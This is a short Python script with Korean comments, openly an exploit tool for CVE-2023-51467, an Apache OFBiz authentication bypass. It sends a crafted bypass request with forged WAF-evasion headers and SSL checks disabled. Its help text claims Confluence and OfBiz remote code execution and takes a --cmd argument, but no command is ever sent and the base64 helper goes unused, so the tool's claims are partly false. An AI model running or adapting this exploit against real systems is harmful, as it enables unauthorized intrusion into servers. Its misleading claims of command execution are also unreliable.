import requests
import argparse
import base64
import urllib.parse
import warnings

# SSL 경고 무시
warnings.simplefilter('ignore', category=UserWarning)

# HTTP 요청 헤더 변조 (WAF 우회)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Referer": "https://google.com",
    "X-Forwarded-For": "127.0.0.1"
}

# Base64 인코딩
def encode_base64(cmd):
    return base64.b64encode(cmd.encode()).decode()

# CVE-2023-51467 Exploit
def exploit_cve_2023_51467(target_url):
    """
    CVE-2023-51467 Exploit (Apache OfBiz Bypass)
    """
    try:
        # Payload
        PAYLOAD = "/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y"
        EXPLOIT_URL = f"{target_url}{PAYLOAD}"

        # Sending the request
        response = requests.get(EXPLOIT_URL, headers=HEADERS, verify=False, allow_redirects=False, timeout=10)
        
        print("[DEBUG] Response Headers:", response.headers)
        print("[DEBUG] Response Body:", response.text)

        # Checking response
        if response.status_code == 200:
            print("[SUCCESS] CVE-2023-51467 Exploit sent successfully!")
            print("Server Response Header (X-Cmd-Response):")
            print(response.headers.get("X-Cmd-Response", "[FAIL] Header not found."))
        else:
            print("[FAIL] CVE-2023-51467 Exploit failed. Check target and parameters.")
    except requests.exceptions.RequestException as err:
        print(f"[ERROR] {err}")
        print("[FAIL] Exploit attempt failed.")

# 메인 함수
def main():
    parser = argparse.ArgumentParser(
        description="Apache Confluence & OfBiz Remote Code Execution (RCE) Exploit Tool",
        usage="python3 exploit.py --url <URL> --cmd <COMMAND>"
    )
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--cmd", required=False, help="Command to execute (only for some exploits)")
    
    args = parser.parse_args()

    print("[INFO] Attempting exploitation...")
    exploit_cve_2023_51467(args.url)

if __name__ == "__main__":
    main()
